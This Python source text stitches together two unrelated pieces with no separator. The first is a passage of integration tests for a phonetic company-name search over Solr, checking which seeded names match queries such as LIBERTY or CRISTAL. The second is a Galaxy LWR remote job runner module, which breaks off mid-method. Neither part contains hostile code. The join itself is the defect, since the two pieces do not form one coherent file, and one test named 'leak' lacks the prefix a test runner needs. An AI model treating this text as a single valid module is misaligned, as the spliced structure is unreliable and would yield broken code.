    seed_database_with(solr, 'GAYLEDESIGNS INC.', id='1')
    seed_database_with(solr, 'GOLDSTREAM ELECTRICAL CORP', id='2')
    seed_database_with(solr, 'GLADSTONE JEWELLERY LTD', id='3')
    seed_database_with(solr, 'GOLDSTEIN HOLDINGS INC.', id='4')
    seed_database_with(solr, 'CLOUDSIDE INN INCORPORATED', id='5')
    seed_database_with(solr, 'GOLDSPRING PROPERTIES LTD', id='6')
    seed_database_with(solr, 'GOLDSTRIPES AVIATION INC', id='7')
    seed_database_with(solr, 'GLADSTONE CAPITAL CORP', id='8')
    seed_database_with(solr, 'KLETAS LAW CORPORATION', id='9')
    seed_database_with(solr, 'COLDSTREAM VENTURES INC.', id='10')
    seed_database_with(solr, 'BLABLA ANYTHING', id='11')
    verify_results(client, jwt,
       query='GOLDSMITHS',
       expected=[
           {'name': '----GOLDSMITHS'},
           {'name': 'COLDSTREAM VENTURES INC.'},
           {'name': 'GOLDSPRING PROPERTIES LTD'},
           {'name': 'GOLDSTEIN HOLDINGS INC.'},
           {'name': 'GOLDSTREAM ELECTRICAL CORP'},
           {'name': 'GOLDSTRIPES AVIATION INC'},
       ]
    )


@integration_synonym_api
@integration_solr
def test_liberti(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'LIBERTI', id='1')
    verify_results(client, jwt,
       query='LIBERTY',
       expected=[
           {'name': '----LIBERTY'},
           {'name': 'LIBERTI'},
       ]
    )


@integration_synonym_api
@integration_solr
def test_deeper(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'LABORATORY', id='1')
    seed_database_with(solr, 'LAPORTE', id='2')
    seed_database_with(solr, 'LIBERTI', id='3')
    verify_results(client, jwt,
       query='LIBERTY',
       expected=[
           {'name': '----LIBERTY'},
           {'name': 'LIBERTI'},
       ]
    )


@integration_synonym_api
@integration_solr
def test_jasmine(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'JASMINE', id='1')
    verify_results(client, jwt,
       query='OSMOND',
       expected=[
           {'name': '----OSMOND'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_fey(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'FEY', id='1')
    verify_results(client, jwt,
       query='FAY',
       expected=[
           {'name': '----FAY'},
           {'name': 'FEY'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_venizia(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'VENIZIA', id='1')
    seed_database_with(solr, 'VENEZIA', id='2')
    seed_database_with(solr, 'VANSEA', id='3')
    seed_database_with(solr, 'WENSO', id='4')
    verify_results(client, jwt,
       query='VENIZIA',
       expected=[
           {'name': '----VENIZIA'},
           {'name': 'VENEZIA'},
       ]
    )


@integration_synonym_api
@integration_solr
def test_ys_and_is(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'CRYSTAL', id='1')
    verify_results(client, jwt,
       query='CRISTAL',
       expected=[
           {'name': '----CRISTAL'},
           {'name': 'CRYSTAL'},
       ]
    )


@integration_synonym_api
@integration_solr
def test_cs_and_ks(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'KOLDSMITHS', id='1')
    verify_results(client, jwt,
       query='COLDSTREAM',
       expected=[
           {'name': '----COLDSTREAM'},
           {'name': 'KOLDSMITHS'},
       ]
    )


@integration_synonym_api
@integration_solr
def test_cs_and_ks_again(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'CRAZY', id='1')
    seed_database_with(solr, 'KAIZEN', id='2')
    verify_results(client, jwt,
       query='CAYZEN',
       expected=[
           {'name': '----CAYZEN'},
           {'name': 'KAIZEN'},
       ]
    )


@integration_synonym_api
@integration_solr
def test_resist_short_word(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'FE', id='1')
    verify_results(client, jwt,
       query='FA',
       expected=[
           {'name': '----FA'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_resist_single_vowel(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'FEDS', id='1')
    verify_results(client, jwt,
       query='FADS',
       expected=[
           {'name': '----FADS'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_feel(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'FEEL', id='1')
    verify_results(client, jwt,
       query='FILL',
       expected=[
           {'name': '----FILL'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_bear(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'BEAR', id='1')
    verify_results(client, jwt,
       query='BARE',
       expected=[
           {'name': '----BARE'},
           {'name': 'BEAR'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_ignore_corp(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'GLADSTONE CAPITAL corp', id='1')
    verify_results(client, jwt,
       query='GOLDSMITHS',
       expected=[
           {'name': '----GOLDSMITHS'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_designation_in_query_is_ignored(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'FINGER LIMATED', id='1')
    verify_results(client, jwt,
       query='SUN LIMITED',
       expected=[
           {'name': '----SUN'}
       ]
    )


@integration_synonym_api
@integration_solr
def leak(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'LEAK', id='1')
    verify_results(client, jwt,
       query='LEEK',
       expected=[
           {'name': 'LEAK'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_plank(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'PLANCK', id='1')
    verify_results(client, jwt,
       query='PLANK',
       expected=[
           {'name': '----PLANK'},
           {'name': 'PLANCK'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_krystal(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'KRYSTAL', id='1')
    verify_results(client, jwt,
       query='CRISTAL',
       expected=[
           {'name': '----CRISTAL'},
           {'name': 'KRYSTAL'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_christal(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'KRYSTAL', id='1')
    verify_results(client, jwt,
       query='CHRISTAL',
       expected=[
           {'name': '----CHRISTAL'},
           {'name': 'KRYSTAL'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_kl(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'KLASS', id='1')
    verify_results(client, jwt,
       query='CLASS',
       expected=[
           {'name': '----CLASS'},
           {'name': 'KLASS'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_pheel(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'PHEEL', id='1')
    verify_results(client, jwt,
       query='FEEL',
       expected=[
           {'name': '----FEEL'},
           {'name': 'PHEEL'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_ghable(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'GHABLE', id='1')
    verify_results(client, jwt,
       query='GABLE',
       expected=[
           {'name': '----GABLE'},
           {'name': 'GHABLE'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_gnat(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'GNAT', id='1')
    verify_results(client, jwt,
       query='NAT',
       expected=[
           {'name': '----NAT'},
           {'name': 'GNAT'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_kn(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'KNAT', id='1')
    verify_results(client, jwt,
       query='NAT',
       expected=[
           {'name': '----NAT'},
           {'name': 'KNAT'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_pn(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'PNEU', id='1')
    verify_results(client, jwt,
       query='NEU',
       expected=[
           {'name': '----NEU'},
           {'name': 'PNEU'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_wr(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'WREN', id='1')
    verify_results(client, jwt,
       query='REN',
       expected=[
           {'name': '----REN'},
           {'name': 'WREN'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_rh(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'RHEN', id='1')
    verify_results(client, jwt,
       query='REN',
       expected=[
           {'name': '----REN'},
           {'name': 'RHEN'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_soft_c_is_not_k(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'KIRK', id='1')
    verify_results(client, jwt,
       query='CIRCLE',
       expected=[
           {'name': '----CIRCLE'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_oi_oy(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'OYSTER', id='1')
    verify_results(client, jwt,
       query='OISTER',
       expected=[
           {'name': '----OISTER'},
           {'name': 'OYSTER'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_dont_add_match_twice(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'RHEN GNAT', id='1')
    verify_results(client, jwt,
       query='REN NAT',
       expected=[
           {'name': '----REN NAT'},
           {'name': 'RHEN GNAT'},
           {'name': '----REN'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_neighbour(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'NEIGHBOUR', id='1')
    verify_results(client, jwt,
       query='NAYBOR',
       expected=[
           {'name': '----NAYBOR'},
           {'name': 'NEIGHBOUR'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_mac_mc(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'MCGREGOR', id='1')
    verify_results(client, jwt,
       query='MACGREGOR',
       expected=[
           {'name': '----MACGREGOR'},
           {'name': 'MCGREGOR'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_ex_x(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'EXTREME', id='1')
    verify_results(client, jwt,
       query='XTREME',
       expected=[
           {'name': '----XTREME'},
           {'name': 'EXTREME'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_wh(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'WHITE', id='1')
    verify_results(client, jwt,
       query='WITE',
       expected=[
           {'name': '----WITE'},
           {'name': 'WHITE'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_qu(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'KWIK', id='1')
    verify_results(client, jwt,
       query='QUICK',
       expected=[
           {'name': '----QUICK'},
           {'name': 'KWIK'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_ps(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'PSYCHO', id='1')
    verify_results(client, jwt,
       query='SYCHO',
       expected=[
           {'name': '----SYCHO'},
           {'name': 'PSYCHO'}
       ]
    )


@pytest.mark.skip(reason="not handled yet")
@integration_synonym_api
@integration_solr
def test_terra(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'TERRA', id='1')
    verify_results(client, jwt,
       query='TARA',
       expected=[
           {'name': 'TERRA'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_ayaan(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'AYAAN', id='1')
    verify_results(client, jwt,
       query='AYAN',
       expected=[
           {'name': '----AYAN'},
           {'name': 'AYAAN'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_aggri(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'AGGRI', id='1')
    verify_results(client, jwt,
       query='AGRI',
       expected=[
           {'name': '----AGRI'},
           {'name': 'AGGRI'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_kofi(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'KOFI', id='1')
    verify_results(client, jwt,
       query='COFFI',
       expected=[
           {'name': '----COFFI'},
           {'name': 'KOFI'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_tru(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'TRU', id='1')
    verify_results(client, jwt,
       query='TRUE',
       expected=[
           {'name': '----TRUE'},
           {'name': 'TRU'}
       ]
    )


@pytest.mark.skip(reason="not handled yet")
@integration_synonym_api
@integration_solr
def test_dymond(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'DYMOND', id='1')
    verify_results(client, jwt,
       query='DIAMOND',
       expected=[
           {'name': 'DYMOND'}
       ]
    )


@pytest.mark.skip(reason="compound words not handled yet")
@integration_synonym_api
@integration_solr
def test_bee_kleen(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'BEE KLEEN', id='1')
    verify_results(client, jwt,
       query='BE-CLEAN',
       expected=[
           {'name': 'BEE KLEEN'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_ignore_exact_match_keep_phonetic(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'BODY BLUEPRINT FITNESS INC.', id='1')
    seed_database_with(solr, 'BLUEPRINT BEAUTEE', id='2')
    verify_results(client, jwt,
       query='BLUEPRINT BEAUTY',
       expected=[
           {'name': '----BLUEPRINT BEAUTY'},
           {'name': 'BLUEPRINT BEAUTEE'},
           {'name': '----BLUEPRINT synonyms:(BEAUTI)'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_match_both_words(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'ANDERSON BEHAVIOR CONSULTING', id='1')
    verify_results(client, jwt,
       query='INTERVENTION BEHAVIOUR',
       expected=[
           {'name': '----INTERVENTION BEHAVIOUR'},
           {'name': '----INTERVENTION'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_match_at_right_level(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'ANDERSON BEHAVIOR CONSULTING INC.', id='1')
    verify_results(client, jwt,
       query='BEHAVIOUR INTERVENTION',
       expected=[
           {'name': '----BEHAVIOUR INTERVENTION'},
           {'name': '----BEHAVIOUR'},
           {'name': 'ANDERSON BEHAVIOR CONSULTING INC.'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_resists_qword_matching_several_words(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'ANDERSON BEHAVIOR BEHAVIOR', id='1')
    verify_results(client, jwt,
       query='BEHAVIOUR INTERVENTION',
       expected=[
           {'name': '----BEHAVIOUR INTERVENTION'},
           {'name': '----BEHAVIOUR'},
           {'name': 'ANDERSON BEHAVIOR BEHAVIOR'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_leading_vowel_a(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'AILEEN ENTERPRISES', id='1')
    verify_results(client, jwt,
       query='ALAN HARGREAVES CORPORATION',
       expected=[
           {'name': '----ALAN HARGREAVES'},
           {'name': '----ALAN'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_leading_vowel_e(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'ACME', id='1')
    verify_results(client, jwt,
       query='EQUIOM',
       expected=[
           {'name': '----EQUIOM'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_leading_vowel_not_match_consonant(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'HELENAH WU & CO. INC.', id='1')
    seed_database_with(solr, 'A BETTER WAY HERBALS LTD.', id='2')
    verify_results(client, jwt,
       query='EH',
       expected=[
           {'name': '----EH'}
       ]
    )


@integration_synonym_api
@integration_solr
def test_unusual_result(solr, client, jwt, app):
    clean_database(solr)
    seed_database_with(solr, 'DOUBLE J AVIATION LTD.', id='1')
    verify_results(client, jwt,
       query='TABLE',
       expected=[
           {'name': '----TABLE'}
       ]
    )

@integration_synonym_api
@integration_solr
def test_stack_ignores_wildcards(client, jwt, app):
    verify_results(client, jwt,
        query="TESTING* @WILDCARDS",
        expected=[
            {'name': '----TESTING WILDCARDS'},
            {'name': '----TESTING'}
        ]
    )

@integration_synonym_api
@integration_solr
@pytest.mark.parametrize("query", [
    ('T.H.E.'),
    ('COMPANY'),
    ('ASSN'),
    ('THAT'),
    ('LIMITED CORP.'),
])
def test_query_stripped_to_empty_string(solr,client, jwt, query):
    clean_database(solr)
    seed_database_with(solr, 'JM Van Damme inc', id='1')
    seed_database_with(solr, 'SOME RANDOM NAME', id='2')
    verify_results(client, jwt,
        query=query,
        expected=[{'name':'----*'}]
    )

import logging

from galaxy import model
from galaxy.jobs.runners import AsynchronousJobState, AsynchronousJobRunner
from galaxy.jobs import ComputeEnvironment
from galaxy.jobs import JobDestination
from galaxy.jobs.command_factory import build_command
from galaxy.tools.deps import dependencies
from galaxy.util import string_as_bool_or_none
from galaxy.util.bunch import Bunch

import errno
from time import sleep
import os

from .lwr_client import build_client_manager
from .lwr_client import url_to_destination_params
from .lwr_client import finish_job as lwr_finish_job
from .lwr_client import submit_job as lwr_submit_job
from .lwr_client import ClientJobDescription
from .lwr_client import LwrOutputs
from .lwr_client import ClientOutputs
from .lwr_client import PathMapper

log = logging.getLogger( __name__ )

__all__ = [ 'LwrJobRunner' ]

NO_REMOTE_GALAXY_FOR_METADATA_MESSAGE = "LWR misconfiguration - LWR client configured to set metadata remotely, but remote LWR isn't properly configured with a galaxy_home directory."
NO_REMOTE_DATATYPES_CONFIG = "LWR client is configured to use remote datatypes configuration when setting metadata externally, but LWR is not configured with this information. Defaulting to datatypes_conf.xml."

# Is there a good way to infer some default for this? Can only use
# url_for from web threads. https://gist.github.com/jmchilton/9098762
DEFAULT_GALAXY_URL = "http://localhost:8080"


class LwrJobRunner( AsynchronousJobRunner ):
    """
    LWR Job Runner
    """
    runner_name = "LWRRunner"

    def __init__( self, app, nworkers, transport=None, cache=None, url=None, galaxy_url=DEFAULT_GALAXY_URL ):
        """Start the job runner """
        super( LwrJobRunner, self ).__init__( app, nworkers )
        self.async_status_updates = dict()
        self._init_monitor_thread()
        self._init_worker_threads()
        client_manager_kwargs = {'transport_type': transport, 'cache': string_as_bool_or_none(cache), "url": url}
        self.galaxy_url = galaxy_url
        self.client_manager = build_client_manager(**client_manager_kwargs)

    def url_to_destination( self, url ):
        """Convert a legacy URL to a job destination"""
        return JobDestination( runner="lwr", params=url_to_destination_params( url ) )

    def check_watched_item(self, job_state):
        try:
            client = self.get_client_from_state(job_state)

            if hasattr(self.client_manager, 'ensure_has_status_update_callback'):
                # Message queue implementation.

                # TODO: Very hacky now, refactor after Dannon merges in his
                # message queue work, runners need the ability to disable
                # check_watched_item like this and instead a callback needs to
                # be issued post job recovery allowing a message queue
                # consumer to be setup.
                self.client_manager.ensure_has_status_update_callback(self.__async_update)
                return job_state

            status = client.get_status()
        except Exception:
            # An orphaned job was put into the queue at app startup, so remote server went down
            # either way we are done I guess.
            self.mark_as_finished(job_state)
            return None
        job_state = self.__update_job_state_for_lwr_status(job_state, status)
        return job_state

    def __update_job_state_for_lwr_status(self, job_state, lwr_status):
        if lwr_status == "complete":
            self.mark_as_finished(job_state)
            return None
        if lwr_status == "running" and not job_state.running:
            job_state.running = True
            job_state.job_wrapper.change_state( model.Job.states.RUNNING )
        return job_state

    def __async_update( self, full_status ):
        job_id = full_status[ "job_id" ]
        job_state = self.__find_watched_job( job_id )
        if not job_state:
            # Probably finished too quickly, sleep and try again.
            # Kind of a hack, why does monitor queue need to no wait
            # get and sleep instead of doing a busy wait that would
            # respond immediately.
            sleep( 2 )
            job_state = self.__find_watched_job( job_id )
        if not job_state:
            log.warn( "Failed to find job corresponding to final status %s in %s" % ( full_status, self.watched ) )
        else:                    
            self.__update_job_state_for_lwr_status(job_state, full_status["status"])

    def __find_watched_job( self, job_id ):
        found_job = None
        for async_job_state in self.watched:
            if str( async_job_state.job_id ) == job_id:
                found_job = async_job_state
                break
        return found_job

    def queue_job(self, job_wrapper):
        job_destination = job_wrapper.job_destination

        command_line, client, remote_job_config, compute_environment = self.__prepare_job( job_wrapper, job_destination )

        if not command_line:
            return

        try:
            dependencies_description = LwrJobRunner.__dependencies_description( client, job_wrapper )
            rewrite_paths = not LwrJobRunner.__rewrite_parameters( client )
            unstructured_path_rewrites = {}
            if compute_environment:
                unstructured_path_rewrites = compute_environment.unstructured_path_rewrites

            client_job_description = ClientJobDescription(
                command_line=command_line,
                input_files=self.get_input_files(job_wrapper),
                client_outputs=self.__client_outputs(client, job_wrapper),
                working_directory=job_wrapper.working_directory,
                tool=job_wrapper.tool,
                config_files=job_wrapper.extra_filenames,
                dependencies_description=dependencies_description,
                env=client.env,
                rewrite_paths=rewrite_paths,
                arbitrary_files=unstructured_path_rewrites,
            )
            job_id = lwr_submit_job(client, client_job_description, remote_job_config)
            log.info("lwr job submitted with job_id %s" % job_id)
            job_wrapper.set_job_destination( job_destination, job_id )
            job_wrapper.change_state( model.Job.states.QUEUED )
        except Exception:
            job_wrapper.fail( "failure running job", exception=True )
            log.exception("failure running job %d" % job_wrapper.job_id)
            return

        lwr_job_state = AsynchronousJobState()
        lwr_job_state.job_wrapper = job_wrapper
        lwr_job_state.job_id = job_id
        lwr_job_state.old_state = True
        lwr_job_state.running = False
        lwr_job_state.job_destination = job_destination
        self.monitor_job(lwr_job_state)

    def __prepare_job(self, job_wrapper, job_destination):
        """ Build command-line and LWR client for this job. """
        command_line = None
        client = None
        remote_job_config = None
        compute_environment = None
        try:
            client = self.get_client_from_wrapper(job_wrapper)
            tool = job_wrapper.tool
            remote_job_config = client.setup(tool.id, tool.version)
            rewrite_parameters = LwrJobRunner.__rewrite_parameters( client )
            prepare_kwds = {}
            if rewrite_parameters:
                compute_environment = LwrComputeEnvironment( client, job_wrapper, remote_job_config )
                prepare_kwds[ 'compute_environment' ] = compute_environment
            job_wrapper.prepare( **prepare_kwds )
            self.__prepare_input_files_locally(job_wrapper)
            remote_metadata = LwrJobRunner.__remote_metadata( client )
            remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )
            dependency_resolution = LwrJobRunner.__dependency_resolution( client )
            metadata_kwds = self.__build_metadata_configuration(client, job_wrapper, remote_metadata, remote_job_config)
            remote_command_params = dict(
                working_directory=remote_job_config['working_directory'],
                metadata_kwds=metadata_kwds,
                dependency_resolution=dependency_resolution,
            )
            command_line = build_command(
                self,
                job_wrapper=job_wrapper,
                include_metadata=remote_metadata,
                include_work_dir_outputs=remote_work_dir_copy,                    
                remote_command_params=remote_command_params,
            )
        except Exception:
            job_wrapper.fail( "failure preparing job", exception=True )
            log.exception("failure running job %d" % job_wrapper.job_id)

        # If we were able to get a command line, run the job
        if not command_line:
            job_wrapper.finish( '', '' )

        return command_line, client, remote_job_config, compute_environment

    def __prepare_input_files_locally(self, job_wrapper):
        """Run task splitting commands locally."""
        prepare_input_files_cmds = getattr(job_wrapper, 'prepare_input_files_cmds', None)
        if prepare_input_files_cmds is not None:
            for cmd in prepare_input_files_cmds:  # run the commands to stage the input files
                if 0 != os.system(cmd):
                    raise Exception('Error running file staging command: %s' % cmd)
            job_wrapper.prepare_input_files_cmds = None  # prevent them from being used in-line

    def get_output_files(self, job_wrapper):
        output_paths = job_wrapper.get_output_fnames()
        return [ str( o ) for o in output_paths ]   # Force job_path from DatasetPath objects.

    def get_input_files(self, job_wrapper):
        input_paths = job_wrapper.get_input_paths()
        return [ str( i ) for i in input_paths ]  # Force job_path from DatasetPath objects.

    def get_client_from_wrapper(self, job_wrapper):
        job_id = job_wrapper.job_id
        if hasattr(job_wrapper, 'task_id'):
            job_id = "%s_%s" % (job_id, job_wrapper.task_id)
        params = job_wrapper.job_destination.params.copy()
        for key, value in params.iteritems():
            if value:
                params[key] = model.User.expand_user_properties( job_wrapper.get_job().user, value )
        env = getattr( job_wrapper.job_destination, "env", [] )
        return self.get_client( params, job_id, env )

    def get_client_from_state(self, job_state):
        job_destination_params = job_state.job_destination.params
        job_id = job_state.job_id
        return self.get_client( job_destination_params, job_id )

    def get_client( self, job_destination_params, job_id, env=[] ):
        # Cannot use url_for outside of web thread.
        #files_endpoint = url_for( controller="job_files", job_id=encoded_job_id )

        encoded_job_id = self.app.security.encode_id(job_id)
        job_key = self.app.security.encode_id( job_id, kind="jobs_files" )
        files_endpoint = "%s/api/jobs/%s/files?job_key=%s" % (
            self.galaxy_url,
            encoded_job_id,
            job_key
        )
        get_client_kwds = dict(
            job_id=str( job_id ),
            files_endpoint=files_endpoint,
            env=env
        )
        return self.client_manager.get_client( job_destination_params, **get_client_kwds )

    def finish_job( self, job_state ):
        stderr = stdout = ''
        job_wrapper = job_state.job_wrapper
        try:
            client = self.get_client_from_state(job_state)
            run_results = client.full_status()

            stdout = run_results.get('stdout', '')
            stderr = run_results.get('stderr', '')
            exit_code = run_results.get('returncode', None)
            lwr_outputs = LwrOutputs.from_status_response(run_results)
            # Use LWR client code to transfer/copy files back
            # and cleanup job if needed.
            completed_normally = \
                job_wrapper.get_state() not in [ model.Job.states.ERROR, model.Job.states.DELETED ]
            cleanup_job = self.app.config.cleanup_job
            client_outputs = self.__client_outputs(client, job_wrapper)
            finish_args = dict( client=client,
                                job_completed_normally=completed_normally,
                                cleanup_job=cleanup_job,
                                client_outputs=client_outputs,
                                lwr_outputs=lwr_outputs )
            failed = lwr_finish_job( **finish_args )

            if failed:
                job_wrapper.fail("Failed to find or download one or more job outputs from remote server.", exception=True)
        except Exception:
            message = "Failed to communicate with remote job server."
            job_wrapper.fail( message, exception=True )
            log.exception("failure finishing job %d" % job_wrapper.job_id)
            return
        if not LwrJobRunner.__remote_metadata( client ):
            self._handle_metadata_externally( job_wrapper, resolve_requirements=True )
        # Finish the job
        try:
            job_wrapper.finish( stdout, stderr, exit_code )
        except Exception:
            log.exception("Job wrapper finish method failed")
            job_wrapper.fail("Unable to finish job", exception=True)

    def fail_job( self, job_state ):
        """
        Seperated out so we can use the worker threads for it.
        """
        self.stop_job( self.sa_session.query( self.app.model.Job ).get( job_state.job_wrapper.job_id ) )
        job_state.job_wrapper.fail( job_state.fail_message )

    def check_pid( self, pid ):
        try:
            os.kill( pid, 0 )
            return True
        except OSError, e:
            if e.errno == errno.ESRCH:
                log.debug( "check_pid(): PID %d is dead" % pid )
            else:                    
                log.warning( "check_pid(): Got errno %s when attempting to check PID %d: %s" % ( errno.errorcode[e.errno], pid, e.strerror ) )
            return False

    def stop_job( self, job ):
        #if our local job has JobExternalOutputMetadata associated, then our primary job has to have already finished
        job_ext_output_metadata = job.get_external_output_metadata()
        if job_ext_output_metadata:
            pid = job_ext_output_metadata[0].job_runner_external_pid  # every JobExternalOutputMetadata has a pid set, we just need to take from one of them
            if pid in [ None, '' ]:
                log.warning( "stop_job(): %s: no PID in database for job, unable to stop" % job.id )
                return
            pid = int( pid )
            if not self.check_pid( pid ):
                log.warning( "stop_job(): %s: PID %d was already dead or can't be signaled" % ( job.id, pid ) )
                return
            for sig in [ 15, 9 ]:
                try:
                    os.killpg( pid, sig )
                except OSError, e:
                    log.warning( "stop_job(): %s: Got errno %s when attempting to signal %d to PID %d: %s" % ( job.id, errno.errorcode[e.errno], sig, pid, e.strerror ) )
                    return  # give up
                sleep( 2 )
                if not self.check_pid( pid ):
                    log.debug( "stop_job(): %s: PID %d successfully killed with signal %d" % ( job.id, pid, sig ) )
                    return
                else:                    
                    log.warning( "stop_job(): %s: PID %d refuses to die after signaling TERM/KILL" % ( job.id, pid ) )
        else:                    
            # Remote kill
            lwr_url = job.job_runner_name
            job_id = job.job_runner_external_id
            log.debug("Attempt remote lwr kill of job with url %s and id %s" % (lwr_url, job_id))
            client = self.get_client(job.destination_params, job_id)
            client.kill()

    def recover( self, job, job_wrapper ):
        """Recovers jobs stuck in the queued/running state when Galaxy started"""
        job_state = AsynchronousJobState()
        job_state.job_id = str( job.get_job_runner_external_id() )
        job_state.runner_url = job_wrapper.get_job_runner_url()
        job_state.job_destination = job_wrapper.job_destination
        job_wrapper.command_line = job.get_command_line()
        job_state.job_wrapper = job_wrapper
        state = job.get_state()
        if state in [model.Job.states.RUNNING, model.Job.states.QUEUED]:
            log.debug( "(LWR/%s) is still in running state, adding to the LWR queue" % ( job.get_id()) )
            job_state.old_state = True
            job_state.running = state == model.Job.states.RUNNING
            self.monitor_queue.put( job_state )

    def shutdown( self ):
        super( LwrJobRunner, self ).shutdown()
        self.client_manager.shutdown()

    def __client_outputs( self, client, job_wrapper ):
        remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )
        if not remote_work_dir_copy:                    
            work_dir_outputs = self.get_work_dir_outputs( job_wrapper )
        else:                    
            # They have already been copied over to look like regular outputs remotely,
            # no need to handle them differently here.
            work_dir_outputs = []                    
        output_files = self.get_output_files( job_wrapper )
        client_outputs = ClientOutputs(
            working_directory=job_wrapper.working_directory,
            work_dir_outputs=work_dir_outputs,
            output_files=output_files,
            version_file=job_wrapper.get_version_string_path(),
        )
        return client_outputs

    @staticmethod                    
    def __dependencies_description( lwr_client, job_wrapper ):
        dependency_resolution = LwrJobRunner.__dependency_resolution( lwr_client )
        remote_dependency_resolution = dependency_resolution == "remote"
        if not remote_dependency_resolution:
            return None
        requirements = job_wrapper.tool.requirements or []
        installed_tool_dependencies = job_wrapper.tool.installed_tool_dependencies or []
        return dependencies.DependenciesDescription(
            requirements=requirements,
            installed_tool_dependencies=installed_tool_dependencies,
        )

    @staticmethod                    
    def __dependency_resolution( lwr_client ):
        dependency_resolution = lwr_client.destination_params.get( "dependency_resolution", "local" )
        if dependency_resolution not in ["none", "local", "remote"]:
            raise Exception("Unknown dependency_resolution value encountered %s" % dependency_resolution)
        return dependency_resolution

    @staticmethod                    
    def __remote_metadata( lwr_client ):
        remote_metadata = string_as_bool_or_none( lwr_client.destination_params.get( "remote_metadata", False ) )
        return remote_metadata

    @staticmethod                    
    def __remote_work_dir_copy( lwr_client ):
        # Right now remote metadata handling assumes from_work_dir outputs
        # have been copied over before it runs. So do that remotely. This is
        # not the default though because adding it to the command line is not
